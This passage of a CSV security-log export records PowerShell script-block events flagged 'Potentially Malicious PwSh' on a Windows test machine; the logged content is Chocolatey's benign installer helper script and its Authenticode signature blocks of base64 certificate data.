CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAig","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:32.752 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,67,"ScriptBlock: AoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgLXLfDm5ZO0F7n2Nexf5QBKk9rmoDUthxG+r4 # F9i69HgwDQYJKoZIhvcNAQEBBQAEggEAb2mru9l/KwdisLhftWBpxN2YplsjnNO8 # zOerUDH77YZLnOp6pfxlw9UDk6p2H7ZSf3PJz+1J4ENwf5p+TfyvqyZyYXPQ32to # qWgjxlTneLaqxbY8CnJe+4NWxDAEhbhSMObYX29KYVIq+iJ1q9yYpR2pNuE+/PAq # I3FXS45kX4WtsOfVnkJnWM/oIKKfEuywPi+a6l4dy/jMsEP3rzCdHjJIziLcIJ34 # lSv2YwwyUk8CYmQfWMAFLZfhH1Y8jmL6IR59aaSJ3oJxesogSfNvDK+LLc6tch7I # enySIVHhp4EaIijUSmbziY7zSHwkwnEwMWOKWcUxUQltJ+Rw/85ynKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUumRD/TbOT5Vq6kjT # F5SC4Ge0EbQwDQYJKoZIhvcNAQEBBQAEggEADeiy6pwgzhNhQoFY5dlA/QDn7A/Z # +0d5nogna5UjTzViKkhfAEXFS7/3Y0MNKSu7K9ypaZ5nSaBImxkGX40IAN0yzsU1 # RpA4GbDCp7JpLvFPmKBnuAKTOgvAr1b+wbojbWa24lAF/8gtvWw8Y4kjKQ3gvtPz # bpZWF+2pp5JBG+dpRHLizYL0ypB6Q/y0Vk9D3UvkdIpTfNG4OFZXxLVeh5/2V192 # LiKSonbjK4o8DXy85RvSk46BG2n1fy5M5vDQZZE6NAN61k306Jz15G76zQZ7vQx8 # bKdBLHWQb5jMK5+3EetGt+PpBoSAXLmYWaKKOojWHMUWnAYUf5kILPdPSA== # SIG # End signature block","MessageNumber: 3 ¦ MessageTotal: 3 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Start-ChocolateyProcessAsAdmin.ps1 ¦ ScriptBlockId: b28016b7-2318-4593-a177-e91b04bf1769 ¦ ScriptBlockText: AoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgLXLfDm5ZO0F7n2Nexf5QBKk9rmoDUthxG+r4 # F9i69HgwDQYJKoZIhvcNAQEBBQAEggEAb2mru9l/KwdisLhftWBpxN2YplsjnNO8 # zOerUDH77YZLnOp6pfxlw9UDk6p2H7ZSf3PJz+1J4ENwf5p+TfyvqyZyYXPQ32to # qWgjxlTneLaqxbY8CnJe+4NWxDAEhbhSMObYX29KYVIq+iJ1q9yYpR2pNuE+/PAq # I3FXS45kX4WtsOfVnkJnWM/oIKKfEuywPi+a6l4dy/jMsEP3rzCdHjJIziLcIJ34 # lSv2YwwyUk8CYmQfWMAFLZfhH1Y8jmL6IR59aaSJ3oJxesogSfNvDK+LLc6tch7I # enySIVHhp4EaIijUSmbziY7zSHwkwnEwMWOKWcUxUQltJ+Rw/85ynKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUumRD/TbOT5Vq6kjT # F5SC4Ge0EbQwDQYJKoZIhvcNAQEBBQAEggEADeiy6pwgzhNhQoFY5dlA/QDn7A/Z # +0d5nogna5UjTzViKkhfAEXFS7/3Y0MNKSu7K9ypaZ5nSaBImxkGX40IAN0yzsU1 # RpA4GbDCp7JpLvFPmKBnuAKTOgvAr1b+wbojbWa24lAF/8gtvWw8Y4kjKQ3gvtPz # bpZWF+2pp5JBG+dpRHLizYL0ypB6Q/y0Vk9D3UvkdIpTfNG4OFZXxLVeh5/2V192 # LiKSonbjK4o8DXy85RvSk46BG2n1fy5M5vDQZZE6NAN61k306Jz15G76zQZ7vQx8 # bKdBLHWQb5jMK5+3EetGt+PpBoSAXLmYWaKKOojWHMUWnAYUf5kILPdPSA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:36.389 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,69,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. $helpersPath = (Split-Path -parent $MyInvocation.MyCommand.Definition); $global:DebugPreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentDebug -eq 'true') { $global:DebugPreference = ""Continue""; } $global:VerbosePreference = ""SilentlyContinue"" if ($env:ChocolateyEnvironmentVerbose -eq 'true') { $global:VerbosePreference = ""Continue""; $verbosity = $true } $installArguments = $env:chocolateyInstallArguments $overrideArgs = $false if ($env:chocolateyInstallOverride -eq 'true') { $overrideArgs = $true } $forceX86 = $false if ($env:chocolateyForceX86 -eq 'true') { $forceX86 = $true } $packageParameters = $env:chocolateyPackageParameters # ensure module loading preference is on $PSModuleAutoLoadingPreference = ""All""; Write-Debug ""Host version is $($host.Version), PowerShell Version is '$($PSVersionTable.PSVersion)' and CLR Version is '$($PSVersionTable.CLRVersion)'."" # grab functions from files Get-Item $helpersPath\functions\*.ps1 | ? { -not ($_.Name.Contains("".Tests."")) } | % { . $_.FullName; #Export-ModuleMember -Function $_.BaseName } # Export built-in functions prior to loading extensions so that # extension-specific loading behavior can be used based on built-in # functions. This allows those overrides to be much more deterministic # This behavior was broken from v0.9.9.5 - v0.10.3. Export-ModuleMember -Function * -Alias * -Cmdlet * $currentAssemblies = [System.AppDomain]::CurrentDomain.GetAssemblies() # load extensions if they exist $extensionsPath = Join-Path ""$helpersPath"" '..\extensions' if (Test-Path($extensionsPath)) { Write-Debug 'Loading community extensions' Get-ChildItem $extensionsPath -recurse -filter ""*.dll"" | Select -ExpandProperty FullName | % { $path = $_; if ($path.Contains(""extensions\chocolatey\lib-synced"")) { continue } try { Write-Debug ""Importing '$path'""; $fileNameWithoutExtension = $([System.IO.Path]::GetFileNameWithoutExtension($path)) Write-Debug ""Loading '$fileNameWithoutExtension' extension.""; $loaded = $false $currentAssemblies | % { $name = $_.GetName().Name if ($name -eq $fileNameWithoutExtension) { Import-Module $_ $loaded = $true } } if (!$loaded) { Import-Module $path; } } catch { if ($env:ChocolateyPowerShellHost -eq 'true') { Write-Warning ""Import failed for '$path'. Error: '$_'"" } else { Write-Warning ""Import failed for '$path'. If it depends on a newer version of the .NET framework, please make sure you are using the built-in PowerShell Host. Error: '$_'"" } } } #Resolve-Path $extensionsPath\**\*\*.psm1 | % { Write-Debug ""Importing `'$_`'""; Import-Module $_.ProviderPath } Get-ChildItem $extensionsPath -recurse -filter ""*.psm1"" | Select -ExpandProperty FullName | % { Write-Debug ""Importing `'$_`'""; Import-Module $_; } } # todo: explore removing this for a future version Export-ModuleMember -Function * -Alias * -Cmdlet * # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCBpXDGe+ALqwCJ # YsrRVbudLVLfjC+vZjhGFqLdiSXpYaCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # 